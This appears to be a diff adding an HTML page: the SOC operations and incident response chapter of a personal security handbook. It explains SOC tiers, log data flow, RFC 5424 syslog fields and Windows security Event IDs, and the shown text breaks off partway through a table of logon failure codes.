@@ -1,0 +1,1460 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Chapter 10 — SOC Operations &amp;amp; Incident Response — Security Handbook</title>
+<meta name="description" content="A security knowledge handbook — notes collected while learning and working in security.">
+<meta property="og:title" content="Chapter 10 — SOC Operations &amp;amp; Incident Response — Security Handbook">
+<meta property="og:description" content="A security knowledge handbook — notes collected while learning and working in security.">
+<meta property="og:type" content="article">
+<link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>📓</text></svg>">
+<link rel="prev" href="ch09.html"><link rel="next" href="ch11.html">
+<script>(function(){var t=localStorage.getItem('kb-theme');if(t&&t!=='light')document.documentElement.setAttribute('data-theme',t);})();</script>
+<style>:root{--wibu-bg:url("../assets/wibu-bg.jpg")}</style>
+<style>
+:root{
+  --bg:#f4efe3; --panel:#ebe3d1; --panel2:#e1d7c0; --ink:#2b2620; --muted:#79705e;
+  --line:#d6cbb3; --accent:#0f6e60; --accent2:#b1502c; --code-bg:#241f18; --code-ink:#ece3d1;
+  --tbl-head:#e6dcc5; --tbl-zebra:#efe8d6; --kbd:#e6dcc5; --codeborder:#3a3228; --scroll:#cabda2;
+  --serif:Georgia,"Iowan Old Style","Times New Roman",serif;
+}
+html[data-theme="dark"]{
+  --bg:#16140f; --panel:#1e1b15; --panel2:#2a261d; --ink:#e9e2d2; --muted:#9c917c;
+  --line:#322d23; --accent:#46b3a3; --accent2:#e0824f; --code-bg:#0e0c08; --code-ink:#e9e2d2;
+  --tbl-head:#2a261d; --tbl-zebra:#1c1914; --kbd:#2c271e; --codeborder:#322d23; --scroll:#3a3328;
+}
+html[data-theme="wibu"]{
+  --bg:#241a38; --panel:rgba(38,28,55,.74); --panel2:rgba(60,44,86,.72); --ink:#f4ecff; --muted:#cbb9e6;
+  --line:rgba(255,255,255,.15); --accent:#ff79b0; --accent2:#a78bff; --code-bg:rgba(15,10,25,.85); --code-ink:#f0e8ff;
+  --tbl-head:rgba(60,44,86,.72); --tbl-zebra:rgba(48,35,70,.45); --kbd:rgba(70,52,98,.7); --codeborder:rgba(255,255,255,.13); --scroll:#7a5fae;
+}
+html[data-theme="wibu"] body{
+  background-color:#241a38;
+  background-image:var(--wibu-bg, none), linear-gradient(135deg,#2a1e44 0%,#46315f 55%,#5a3f74 100%);
+  background-size:cover; background-position:center; background-attachment:fixed;
+}
+html[data-theme="wibu"] .sidebar,
+html[data-theme="wibu"] .brand,
+html[data-theme="wibu"] .search,
+html[data-theme="wibu"] .topbar{backdrop-filter:blur(12px);-webkit-backdrop-filter:blur(12px)}
+html[data-theme="wibu"] .main{background:rgba(18,12,30,.55);border:1px solid var(--line);border-radius:16px;
+  margin-top:20px;margin-bottom:20px;backdrop-filter:blur(4px);-webkit-backdrop-filter:blur(4px)}
+*{box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{margin:0;background:var(--bg);color:var(--ink);
+  font:16px/1.72 -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,"Noto Sans",sans-serif;}
+a{color:var(--accent);text-decoration:none}
+a:hover{text-decoration:underline}
+
+.wrap{display:flex;min-height:100vh}
+.sidebar{width:322px;flex:0 0 322px;background:var(--panel);border-right:1px solid var(--line);
+  height:100vh;position:sticky;top:0;overflow-y:auto;padding:0}
+.brand{padding:20px 18px 13px;border-bottom:1px solid var(--line);position:sticky;top:0;background:var(--panel);z-index:2}
+.brand h1{font-family:var(--serif);font-size:19px;margin:0 0 3px;letter-spacing:.2px;color:var(--ink)}
+.brand .tag{margin:3px 0 0;font-size:11.5px;color:var(--muted);line-height:1.45}
+.brand .author{display:block;margin-top:7px;font-size:11.5px;color:var(--accent2);font-weight:600}
+.controls{display:flex;gap:7px;margin-top:11px}
+.ctrl-btn{display:inline-flex;align-items:center;justify-content:center;gap:5px;background:var(--bg);
+  border:1px solid var(--line);color:var(--ink);border-radius:7px;padding:5px 10px;font-size:12px;
+  cursor:pointer;font-family:inherit;line-height:1;text-decoration:none}
+.ctrl-btn:hover{border-color:var(--accent);text-decoration:none}
+.search{padding:10px 14px;position:sticky;top:118px;background:var(--panel);z-index:2;border-bottom:1px solid var(--line)}
+.search input{width:100%;background:var(--bg);border:1px solid var(--line);color:var(--ink);
+  border-radius:7px;padding:8px 10px;font-size:13px;outline:none}
+.search input:focus{border-color:var(--accent)}
+.nav{padding:8px 8px 40px}
+.nav-group{padding:16px 10px 5px;font-family:var(--serif);font-size:11px;font-weight:700;letter-spacing:.4px;
+  text-transform:uppercase;color:var(--accent2)}
+.nav-chapter{margin:1px 0}
+.nav-ch-title{display:flex;gap:9px;align-items:baseline;padding:7px 10px;border-radius:7px;color:var(--ink);font-size:13.5px}
+.nav-ch-title .num{font-family:var(--serif);font-size:11px;color:var(--muted);font-variant-numeric:tabular-nums;min-width:18px}
+.nav-ch-title:hover{background:var(--panel2);text-decoration:none}
+.nav-chapter.active>.nav-ch-title{background:var(--bg);box-shadow:inset 3px 0 0 var(--accent);color:var(--ink);font-weight:700}
+.nav-chapter.active>.nav-ch-title .num{color:var(--accent)}
+.nav-subs{display:none;margin:2px 0 6px 27px;border-left:1px solid var(--line);padding-left:9px}
+.nav-chapter.open .nav-subs{display:block}
+.nav-sub{display:block;padding:4px 8px;font-size:12px;color:var(--muted);border-radius:6px;line-height:1.4}
+.nav-sub:hover{color:var(--accent);background:var(--panel2);text-decoration:none}
+
+.content{flex:1;min-width:0;padding:0 0 120px}
+.topbar{display:none}
+.main{max-width:820px;margin:0 auto;padding:40px 44px}
+.chapter{border-bottom:1px solid var(--line);padding-bottom:44px;margin-bottom:14px}
+.chapter h1{font-family:var(--serif);font-size:31px;line-height:1.22;margin:40px 0 20px;padding-bottom:12px;
+  border-bottom:2px solid var(--accent);color:var(--ink);scroll-margin-top:16px}
+.chapter:first-child h1{margin-top:8px}
+h2{font-family:var(--serif);font-size:23px;margin:36px 0 12px;color:var(--ink);scroll-margin-top:16px}
+h3{font-family:var(--serif);font-size:18px;margin:24px 0 8px;color:var(--ink);scroll-margin-top:16px}
+h4{font-size:14px;margin:18px 0 6px;color:var(--accent);font-weight:700}
+p{margin:11px 0}
+ul,ol{margin:11px 0;padding-left:24px}
+li{margin:5px 0}
+strong{color:var(--ink);font-weight:700}
+hr{border:0;border-top:1px solid var(--line);margin:28px 0}
+blockquote{margin:15px 0;padding:9px 16px;border-left:3px solid var(--accent2);
+  background:var(--panel);border-radius:0 7px 7px 0;color:var(--muted)}
+
+code{font-family:"SF Mono","JetBrains Mono",Consolas,"Liberation Mono",monospace;font-size:13px}
+:not(pre)>code{background:var(--kbd);color:var(--accent2);padding:1.5px 6px;border-radius:5px;font-size:12.5px}
+pre{background:var(--code-bg);border:1px solid var(--codeborder);border-radius:9px;padding:14px 16px;
+  overflow-x:auto;margin:15px 0;line-height:1.55}
+pre code{color:var(--code-ink);background:none;padding:0;font-size:12.7px;white-space:pre}
+
+.tbl-scroll,table{width:100%}
+table{border-collapse:collapse;margin:16px 0;font-size:13.5px;display:block;overflow-x:auto}
+th,td{border:1px solid var(--line);padding:8px 11px;text-align:left;vertical-align:top}
+th{background:var(--tbl-head);color:var(--ink);font-weight:700;white-space:nowrap}
+tbody tr:nth-child(even){background:var(--tbl-zebra)}
+
+.menu-btn{display:none}
+@media(max-width:980px){
+  .sidebar{position:fixed;left:0;top:0;z-index:50;transform:translateX(-100%);transition:transform .25s}
+  .sidebar.show{transform:none;box-shadow:0 0 40px rgba(20,15,8,.45)}
+  .topbar{display:flex;align-items:center;gap:10px;position:sticky;top:0;z-index:40;
+    background:var(--panel);border-bottom:1px solid var(--line);padding:10px 16px}
+  .menu-btn{display:inline-flex;background:var(--bg);border:1px solid var(--line);color:var(--ink);
+    border-radius:7px;padding:7px 12px;font-size:14px;cursor:pointer}
+  .topbar .ttl{font-family:var(--serif);font-size:15px;font-weight:700;flex:1}
+  .main{padding:24px 18px}
+  .chapter h1{font-size:25px}
+}
+::-webkit-scrollbar{width:11px;height:11px}
+::-webkit-scrollbar-thumb{background:var(--scroll);border-radius:6px;border:2px solid var(--bg)}
+::-webkit-scrollbar-track{background:transparent}
+
+.site-foot{max-width:820px;margin:54px auto 0;padding:24px 44px 0;border-top:1px solid var(--line);
+  color:var(--muted);font-size:13px;line-height:1.7}
+.site-foot a{color:var(--accent)}
+.site-foot .name{color:var(--ink);font-weight:700}
+@media(max-width:980px){.site-foot{padding:24px 18px 0}}
+.brand h1 a{color:var(--ink);text-decoration:none}
+.brand h1 a:hover{color:var(--accent)}
+.nav-sub.here{color:var(--accent);background:var(--panel2);font-weight:600}
+.pager{max-width:820px;margin:34px auto 0;display:flex;gap:14px;justify-content:space-between}
+.pg{flex:1 1 0;min-width:0;display:block;padding:13px 16px;border:1px solid var(--line);border-radius:10px;
+  background:var(--panel);color:var(--ink);text-decoration:none}
+a.pg:hover{border-color:var(--accent);text-decoration:none}
+a.pg:hover b{color:var(--accent)}
+.pg span{display:block;font-size:11.5px;color:var(--muted);margin-bottom:3px}
+.pg b{display:block;font-size:13.5px;font-weight:600;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.pg.next{text-align:right}
+span.pg{border:0;background:none}
+@media(max-width:980px){.pager{padding:0 18px}}
+</style>
+</head>
+<body>
+<div class="wrap">
+  <aside class="sidebar" id="sidebar">
+    <div class="brand"><h1><a href="notes.html">Security Handbook</a></h1>
+      <p class="tag">Notes from learning &amp; working in security</p>
+      <span class="author">✍️ Fee</span>
+      <div class="controls"><a class="ctrl-btn" href="../">🏠 Home</a><button class="ctrl-btn themeBtn" title="Light / Dark / Wibu">🌙</button><a class="ctrl-btn themeLink" href="../notes.html">🌐 VI</a></div></div>
+    <div class="search"><input id="q" type="search" placeholder="Filter contents…" autocomplete="off"></div>
+    <nav class="nav"><div class="nav-chapter" data-ch="00"><a class="nav-ch-title" href="notes.html"><span class="num">00</span><span class="t">Intro &amp; Contents</span></a><div class="nav-subs"></div></div><div class="nav-group">Part A · Fundamentals</div><div class="nav-chapter" data-ch="01"><a class="nav-ch-title" href="ch01.html"><span class="num">01</span><span class="t">Networking</span></a><div class="nav-subs"></div></div><div class="nav-chapter" data-ch="02"><a class="nav-ch-title" href="ch02.html"><span class="num">02</span><span class="t">Linux</span></a><div class="nav-subs"></div></div><div class="nav-chapter" data-ch="03"><a class="nav-ch-title" href="ch03.html"><span class="num">03</span><span class="t">Windows &amp; Active Directory</span></a><div class="nav-subs"></div></div><div class="nav-chapter" data-ch="04"><a class="nav-ch-title" href="ch04.html"><span class="num">04</span><span class="t">Cryptography &amp; Foundations</span></a><div class="nav-subs"></div></div><div class="nav-group">Part B · Application Security &amp; DevSecOps</div><div class="nav-chapter" data-ch="05"><a class="nav-ch-title" href="ch05.html"><span class="num">05</span><span class="t">Web App Security (OWASP)</span></a><div class="nav-subs"></div></div><div class="nav-chapter" data-ch="06"><a class="nav-ch-title" href="ch06.html"><span class="num">06</span><span class="t">DevSecOps &amp; Code Scanning</span></a><div class="nav-subs"></div></div><div class="nav-chapter" data-ch="07"><a class="nav-ch-title" href="ch07.html"><span class="num">07</span><span class="t">CI/CD &amp; GitOps</span></a><div class="nav-subs"></div></div><div class="nav-group">Part C · Monitoring, Detection &amp; Response</div><div class="nav-chapter" data-ch="08"><a class="nav-ch-title" href="ch08.html"><span class="num">08</span><span class="t">SIEM &amp; Log Management</span></a><div class="nav-subs"></div></div><div class="nav-chapter" data-ch="09"><a class="nav-ch-title" href="ch09.html"><span class="num">09</span><span class="t">Observability &amp; Monitoring</span></a><div class="nav-subs"></div></div><div class="nav-chapter open active" data-ch="10"><a class="nav-ch-title" href="#top"><span class="num">10</span><span class="t">SOC &amp; Incident Response</span></a><div class="nav-subs"><a class="nav-sub" href="#ch10-overview">Overview</a><a class="nav-sub" href="#ch10-101-soc-architecture-overview-and-data-flow">10.1. SOC architecture overview and data flow</a><a class="nav-sub" href="#ch10-102-log-formats-at-the-bytefield-level-the-foundation-you-must-know">10.2. Log formats at the byte/field level — the foundation you must know</a><a class="nav-sub" href="#ch10-103-soc-structure-by-tier-the-exact-responsibilities-of-each-level">10.3. SOC structure by tier — the exact responsibilities of each level</a><a class="nav-sub" href="#ch10-104-alert-triage-process-step-by-step">10.4. Alert triage process — step by step</a><a class="nav-sub" href="#ch10-105-incident-response-lifecycle-nist-sp-800-61-and-sans-picerl">10.5. Incident response lifecycle — NIST SP 800-61 and SANS PICERL</a><a class="nav-sub" href="#ch10-106-sample-playbooks-runbooks">10.6. Sample playbooks / runbooks</a><a class="nav-sub" href="#ch10-107-measurement-metrics-mttd-mttr">10.7. Measurement metrics — MTTD, MTTR</a><a class="nav-sub" href="#ch10-108-practical-tools-runnable-examples">10.8. Practical tools — runnable examples</a><a class="nav-sub" href="#ch10-109-threat-hunting-hypotheses-based-on-mitre-attck">10.9. Threat Hunting — hypotheses based on MITRE ATT&amp;amp;CK</a><a class="nav-sub" href="#ch10-1010-worked-example-analysis-from-start-to-finish">10.10. Worked example — analysis from start to finish</a><a class="nav-sub" href="#ch10-1011-chain-of-custody-basic-forensics">10.11. Chain of Custody &amp;amp; basic forensics</a><a class="nav-sub" href="#ch10-1012-log-retention-storage-policy-and-reasoning">10.12. Log Retention — storage policy and reasoning</a><a class="nav-sub" href="#ch10-1013-summary-tying-the-pieces-together">10.13. Summary — tying the pieces together</a><a class="nav-sub" href="#ch10-my-notes">My notes</a></div></div><div class="nav-group">Part D · Network Defense &amp; Testing</div><div class="nav-chapter" data-ch="11"><a class="nav-ch-title" href="ch11.html"><span class="num">11</span><span class="t">Network Defense (IDS/WAF/VPN)</span></a><div class="nav-subs"></div></div><div class="nav-chapter" data-ch="12"><a class="nav-ch-title" href="ch12.html"><span class="num">12</span><span class="t">Pentest &amp; Vuln Assessment</span></a><div class="nav-subs"></div></div><div class="nav-group">Part E · Infrastructure, Virtualization &amp; Cloud</div><div class="nav-chapter" data-ch="13"><a class="nav-ch-title" href="ch13.html"><span class="num">13</span><span class="t">Cloud Security</span></a><div class="nav-subs"></div></div><div class="nav-chapter" data-ch="14"><a class="nav-ch-title" href="ch14.html"><span class="num">14</span><span class="t">Virtualization &amp; Containers</span></a><div class="nav-subs"></div></div><div class="nav-group">Part F · Offense, Compliance &amp; Automation</div><div class="nav-chapter" data-ch="15"><a class="nav-ch-title" href="ch15.html"><span class="num">15</span><span class="t">Threat Intel &amp; Frameworks</span></a><div class="nav-subs"></div></div><div class="nav-chapter" data-ch="16"><a class="nav-ch-title" href="ch16.html"><span class="num">16</span><span class="t">Compliance &amp; Governance (GRC)</span></a><div class="nav-subs"></div></div><div class="nav-chapter" data-ch="17"><a class="nav-ch-title" href="ch17.html"><span class="num">17</span><span class="t">Programming &amp; Automation</span></a><div class="nav-subs"></div></div><div class="nav-group">Appendix</div><div class="nav-chapter" data-ch="99"><a class="nav-ch-title" href="ch99.html"><span class="num">99</span><span class="t">Glossary &amp; Abbreviations</span></a><div class="nav-subs"></div></div></nav>
+  </aside>
+  <div class="content">
+    <div class="topbar"><button class="menu-btn" id="menu">☰</button><span class="ttl">Security Handbook</span>
+      <button class="ctrl-btn themeBtn" title="Light / Dark / Wibu">🌙</button><a class="ctrl-btn themeLink" href="../notes.html">🌐 VI</a></div>
+    <main class="main" id="top">
+      <section class="chapter" id="sec-10" data-ch="10">
+<h1 id="ch10-chapter-10-soc-operations-incident-response">Chapter 10 — SOC Operations &amp; Incident Response</h1>
+<h2 id="ch10-overview">Overview</h2>
+<p>The first time I sat a SOC shift, what threw me wasn't the attacks — it was the sheer volume of alerts. Thousands a day, the overwhelming majority harmless, and someone has to decide in seconds which ones actually matter. This chapter is what I learned about how a <strong>SOC</strong> (Security Operations Center — a 24/7 team of people, process, and technology) turns that filtering into something systematic instead of relying on individual gut feeling.</p>
+<p>Everything starts with <strong>logs</strong> — event records that every server, device, and application generates on its own, except each platform speaks a different dialect (Syslog on Linux, Event Log on Windows, CEF on security appliances), so nothing is analyzable until it's normalized to one schema. A SOC doesn't spread the work evenly: splitting it into <strong>Tier 1/2/3</strong> — quick true/false-positive triage on the front line, up through deep investigation and proactive threat hunting at Tier 3 — keeps expensive specialists off simple work and routes the hard cases to people who can actually handle them. <strong>Triage</strong> itself has to be standardized too, because treating every alert the same way is how a threat disguised as normal traffic slips through.</p>
+<p>When an incident is real, improvising — powering a machine off the moment something looks wrong — can destroy evidence and let it spread. That's why there are two nearly equivalent standard frameworks: <strong>NIST SP 800-61</strong> (4 phases: Preparation → Detection &amp; Analysis → Containment, Eradication &amp; Recovery → Post-Incident Activity) and <strong>SANS PICERL</strong> (6 steps, breaking Containment/Eradication/Recovery apart), both enforcing the same sequence — contain first, preserve evidence, then eradicate and recover. A <strong>playbook</strong> lays out the high-level process for a given incident type; a <strong>runbook</strong> breaks it down into the exact commands and queries so even a junior analyst gets it right under pressure. <strong>MTTD</strong> and <strong>MTTR</strong> are the two numbers that measure how fast all of this actually runs — the longer an attacker's dwell time in the network, the worse the damage, so shortening these two metrics directly shortens the damage.</p>
+<p>The rest of the chapter gets into concrete tooling and technique, since no human can manually process billions of logs or every individual packet — detection and investigation platforms (<strong>SIEM</strong> centralizes logs for querying and rule-based alerting; <strong>Sigma</strong> writes a detection rule once and translates it across SIEMs; <strong>Suricata</strong> analyzes packets by signature; <strong>YARA</strong> identifies malware by pattern within files; <strong>Splunk/SPL</strong> and <strong>osquery/Velociraptor</strong> query endpoint state; <strong>TheHive/SOAR</strong> automates repetitive steps) extend that capability to scale. <strong>Threat hunting</strong> goes further than automated detection: proactively chasing an attacker's traces from a hypothesis, grounded in the <strong>MITRE ATT&amp;CK</strong> framework's classification of attack techniques — because sophisticated attackers know how to evade existing rules. In forensics, <strong>chain of custody</strong> documents who held evidence and when to keep it legally defensible, while volatile data like RAM has to be collected in <strong>order of volatility</strong> before it's lost at power-off — the reason many playbooks call for isolating the network but keeping the machine running. And because an attacker can hide for months before surfacing, <strong>log retention</strong> policy (usually tiered hot/warm/cold) determines whether an investigation still has a trail to follow.</p>
+<blockquote>
+<p>Each section below follows the same axis — what it is → internal mechanism → real-world example → security notes — and any uncertain figure is flagged "needs verification".</p>
+</blockquote>
+<hr />
+<h2 id="ch10-101-soc-architecture-overview-and-data-flow">10.1. SOC architecture overview and data flow</h2>
+<h3 id="ch10-1011-what-a-soc-is-and-why-it-exists">10.1.1. What a SOC is and why it exists</h3>
+<p>A <strong>SOC (Security Operations Center)</strong> is a unit (people + processes + technology) responsible for continuous monitoring (typically 24/7), detection, analysis, and response to security events across the organization's entire digital infrastructure. Why it exists: defense is fundamentally a problem of <strong>early detection within a sea of noisy data</strong>. A mid-sized enterprise can generate billions of event logs per day; only a very small portion of those are signs of a real attack. The SOC is the organizational mechanism for separating signal from noise in a way that is systematic, repeatable, and measurable.</p>
+<h3 id="ch10-1012-end-to-end-data-flow-in-a-soc">10.1.2. End-to-end data flow in a SOC</h3>
+<p>To understand everything that follows, you need to know precisely where the data goes and how it is transformed:</p>
+<pre><code>[Log sources]          [Transport]           [Normalize/Store]        [Detection]        [People]
+ Endpoint (EDR) ──┐
+ Firewall/IDS  ───┤   syslog/UDP 514
+ Web server    ───┼──&gt; TCP 6514 (TLS) ──&gt; Collector ──&gt; Parser/Normalize ──&gt; SIEM ──&gt; Alert ──&gt; Analyst
+ Cloud (CT logs)──┤   Beats/Agent             (Logstash,    (ECS, CIM)       (rule,    (Tier 1/2/3)
+ AD/Auth       ───┘   Kafka                    Vector)                        ML, corr)
+</code></pre>
+<p><strong>Explanation of each stage:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Stage</th>
+<th>Role</th>
+<th>Typical data format</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Log source</td>
+<td>Generates raw events</td>
+<td>Windows Event (EVTX/XML), Syslog (RFC 5424), JSON, CEF, LEEF</td>
+</tr>
+<tr>
+<td>Transport</td>
+<td>Carries logs from sources to a central location</td>
+<td>Syslog over UDP/TCP/TLS, Filebeat/Fluentd, Kafka topic</td>
+</tr>
+<tr>
+<td>Normalization</td>
+<td>Maps to a common schema for querying</td>
+<td>ECS (Elastic Common Schema), Splunk CIM, OCSF</td>
+</tr>
+<tr>
+<td>SIEM</td>
+<td>Stores, indexes, runs correlation rules</td>
+<td>Inverted index, time-series store</td>
+</tr>
+<tr>
+<td>Detection</td>
+<td>Generates alerts from rules/ML/correlation</td>
+<td>Sigma rule, EQL, SPL, KQL</td>
+</tr>
+<tr>
+<td>People</td>
+<td>Triage, investigate, respond</td>
+<td>Ticket, playbook, case</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Why the layered design:</strong> decoupling source — transport — storage — detection allows each component to be replaced independently (swap the SIEM without reconfiguring every endpoint), absorb load with buffers (Kafka absorbs bursts), and apply distinct security controls at each stage (transport encryption, access control over the log store).</p>
+<hr />
+<h2 id="ch10-102-log-formats-at-the-bytefield-level-the-foundation-you-must-know">10.2. Log formats at the byte/field level — the foundation you must know</h2>
+<p>SOC analysis begins with reading each log field correctly. Below are the core formats dissected down to the field level.</p>
+<h3 id="ch10-1021-syslog-rfc-5424-dissecting-each-field">10.2.1. Syslog RFC 5424 — dissecting each field</h3>
+<p>RFC 5424 (2009) defines the modern syslog format, replacing RFC 3164 (the old BSD syslog). An RFC 5424 syslog message has the structure:</p>
+<pre><code>&lt;PRI&gt;VERSION SP TIMESTAMP SP HOSTNAME SP APP-NAME SP PROCID SP MSGID SP STRUCTURED-DATA SP MSG
+</code></pre>
+<p>A real-world example line:</p>
+<pre><code>&lt;34&gt;1 2026-06-19T08:21:09.003Z auth-srv-01 sshd 4821 ID47 [exampleSDID@32473 iut=&quot;3&quot;] Failed password for invalid user admin from 203.0.113.45 port 51022 ssh2
+</code></pre>
+<p>Field-by-field breakdown:</p>
+<table>
+<thead>
+<tr>
+<th>Field</th>
+<th>Size</th>
+<th>Meaning</th>
+<th>Example</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>PRI</td>
+<td>3–5 characters, including <code>&lt;</code> <code>&gt;</code></td>
+<td>Priority = Facility×8 + Severity</td>
+<td><code>&lt;34&gt;</code></td>
+</tr>
+<tr>
+<td>VERSION</td>
+<td>1–2 characters (numeric)</td>
+<td>Format version, always <code>1</code> for RFC 5424</td>
+<td><code>1</code></td>
+</tr>
+<tr>
+<td>TIMESTAMP</td>
+<td>up to 32 characters, RFC 3339</td>
+<td>Time the event was generated, with timezone</td>
+<td><code>2026-06-19T08:21:09.003Z</code></td>
+</tr>
+<tr>
+<td>HOSTNAME</td>
+<td>≤ 255 characters</td>
+<td>Name/IP of the machine that generated the log</td>
+<td><code>auth-srv-01</code></td>
+</tr>
+<tr>
+<td>APP-NAME</td>
+<td>≤ 48 characters</td>
+<td>Application name</td>
+<td><code>sshd</code></td>
+</tr>
+<tr>
+<td>PROCID</td>
+<td>≤ 128 characters</td>
+<td>PID or process id</td>
+<td><code>4821</code></td>
+</tr>
+<tr>
+<td>MSGID</td>
+<td>≤ 32 characters</td>
+<td>Message type</td>
+<td><code>ID47</code></td>
+</tr>
+<tr>
+<td>STRUCTURED-DATA</td>
+<td>variable</td>
+<td>Structured key=value pairs, <code>[SDID param="val"]</code> or <code>-</code> if empty</td>
+<td><code>[exampleSDID@32473 iut="3"]</code></td>
+</tr>
+<tr>
+<td>MSG</td>
+<td>remainder</td>
+<td>Free-form content (UTF-8, may begin with the BOM EF BB BF)</td>
+<td><code>Failed password ...</code></td>
+</tr>
+</tbody>
+</table>
+<p><strong>Decoding the PRI field <code>&lt;34&gt;</code></strong> — this is a commonly misunderstood point:</p>
+<p>PRI is an integer = <code>Facility * 8 + Severity</code>.</p>
+<pre><code>34 / 8 = 4  (integer part) -&gt; Facility = 4  (security/authorization messages)
+34 % 8 = 2                 -&gt; Severity = 2  (Critical)
+</code></pre>
+<p>Severity table (RFC 5424 §6.2.1):</p>
+<table>
+<thead>
+<tr>
+<th>Value</th>
+<th>Name</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>0</td>
+<td>Emergency</td>
+<td>System is unusable</td>
+</tr>
+<tr>
+<td>1</td>
+<td>Alert</td>
+<td>Action must be taken immediately</td>
+</tr>
+<tr>
+<td>2</td>
+<td>Critical</td>
+<td>Critical condition</td>
+</tr>
+<tr>
+<td>3</td>
+<td>Error</td>
+<td>Error</td>
+</tr>
+<tr>
+<td>4</td>
+<td>Warning</td>
+<td>Warning</td>
+</tr>
+<tr>
+<td>5</td>
+<td>Notice</td>
+<td>Normal but significant condition</td>
+</tr>
+<tr>
+<td>6</td>
+<td>Informational</td>
+<td>Informational</td>
+</tr>
+<tr>
+<td>7</td>
+<td>Debug</td>
+<td>Debug</td>
+</tr>
+</tbody>
+</table>
+<p>Facility table (some important values): 0=kernel, 1=user, 2=mail, 3=daemon, 4=auth/security, 10=authpriv, 16–23=local0–local7.</p>
+<p><strong>Why Facility and Severity are packed into one byte:</strong> the design dates from an era of narrow bandwidth and small packets; a single integer lets routers/collectors filter quickly (for example, "only forward messages with severity ≤ 3") without parsing the entire message.</p>
+<p><strong>Security note:</strong> UDP 514 has no authentication, no encryption, and no guarantee of ordering or delivery. An attacker can <strong>spoof</strong> logs (forge the source) to create noise or erase traces by injecting fake logs. Production must use <strong>syslog over TLS (RFC 5425, TCP 6514)</strong> with mutual certificates.</p>
+<h3 id="ch10-1022-windows-event-log-evtx-and-the-key-security-fields">10.2.2. Windows Event Log (EVTX) and the key security fields</h3>
+<p>Windows records events in the binary EVTX format but queries them in XML. Each event has the structure:</p>
+<pre><code class="language-xml">&lt;Event xmlns=&quot;http://schemas.microsoft.com/win/2004/08/events/event&quot;&gt;
+  &lt;System&gt;
+    &lt;Provider Name=&quot;Microsoft-Windows-Security-Auditing&quot; Guid=&quot;{54849625-...}&quot;/&gt;
+    &lt;EventID&gt;4625&lt;/EventID&gt;
+    &lt;Version&gt;0&lt;/Version&gt;
+    &lt;Level&gt;0&lt;/Level&gt;
+    &lt;Task&gt;12544&lt;/Task&gt;
+    &lt;Opcode&gt;0&lt;/Opcode&gt;
+    &lt;Keywords&gt;0x8010000000000000&lt;/Keywords&gt;
+    &lt;TimeCreated SystemTime=&quot;2026-06-19T08:21:09.003Z&quot;/&gt;
+    &lt;EventRecordID&gt;184756&lt;/EventRecordID&gt;
+    &lt;Channel&gt;Security&lt;/Channel&gt;
+    &lt;Computer&gt;WIN-DC01&lt;/Computer&gt;
+    &lt;Security/&gt;
+  &lt;/System&gt;
+  &lt;EventData&gt;
+    &lt;Data Name=&quot;TargetUserName&quot;&gt;admin&lt;/Data&gt;
+    &lt;Data Name=&quot;IpAddress&quot;&gt;203.0.113.45&lt;/Data&gt;
+    &lt;Data Name=&quot;LogonType&quot;&gt;3&lt;/Data&gt;
+    &lt;Data Name=&quot;Status&quot;&gt;0xC000006D&lt;/Data&gt;
+    &lt;Data Name=&quot;SubStatus&quot;&gt;0xC0000064&lt;/Data&gt;
+  &lt;/EventData&gt;
+&lt;/Event&gt;
+</code></pre>
+<p>A table of security Event IDs you must memorize:</p>
+<table>
+<thead>
+<tr>
+<th>Event ID</th>
+<th>Meaning</th>
+<th>Used to detect</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>4624</td>
+<td>Successful logon</td>
+<td>Access tracking, baseline</td>
+</tr>
+<tr>
+<td>4625</td>
+<td>Failed logon</td>
+<td>Brute-force, password spray</td>
+</tr>
+<tr>
+<td>4634 / 4647</td>
+<td>Logoff</td>
+<td>Session correlation</td>
+</tr>
+<tr>
+<td>4672</td>
+<td>Special privileges assigned to a logon</td>
+<td>Admin/privilege detection</td>
+</tr>
+<tr>
+<td>4688</td>
+<td>New process creation (with cmdline if enabled)</td>
+<td>Malicious execution detection</td>
+</tr>
+<tr>
+<td>4768 / 4769</td>
+<td>Kerberos TGT / Service ticket</td>
+<td>Kerberoasting, Golden Ticket</td>
+</tr>
+<tr>
+<td>4719</td>
+<td>Audit policy change</td>
+<td>Attacker disabling auditing</td>
+</tr>
+<tr>
+<td>1102</td>
+<td>Security log cleared</td>
+<td>Anti-forensics</td>
+</tr>
+<tr>
+<td>7045</td>
+<td>New service installed</td>
+<td>Persistence</td>
+</tr>
+</tbody>
+</table>
+<p><strong>The <code>LogonType</code> field (Event 4624/4625)</strong> — very important for distinguishing the type of access:</p>
+<table>
+<thead>
+<tr>
+<th>LogonType</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>2</td>
+<td>Interactive (logon at the machine)</td>
+</tr>
+<tr>
+<td>3</td>
+<td>Network (file share access, RDP over NLA)</td>
+</tr>
+<tr>
+<td>4</td>
+<td>Batch (scheduled task)</td>
+</tr>
+<tr>
+<td>5</td>
+<td>Service</td>
+</tr>
+<tr>
+<td>7</td>
+<td>Unlock (screen unlock)</td>
+</tr>
+<tr>
+<td>8</td>
+<td>NetworkCleartext (password sent in cleartext — suspicious)</td>
+</tr>
+<tr>
+<td>9</td>
+<td>NewCredentials (runas /netonly)</td>
+</tr>
+<tr>
+<td>10</td>
+<td>RemoteInteractive (RDP)</td>
+</tr>
+<tr>
+<td>11</td>
+<td>CachedInteractive (using cached credentials)</td>
+</tr>
+</tbody>
+</table>
+<p><strong>The <code>Status</code>/<code>SubStatus</code> fields (Event 4625)</strong> — NTSTATUS error codes that indicate why the logon failed:</p>
+<table>
+<thead>
+<tr>
+<th>Code</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>0xC0000064</td>
+<td>User does not exist</td>
+</tr>
+<tr>
+<td>0xC000006A</td>
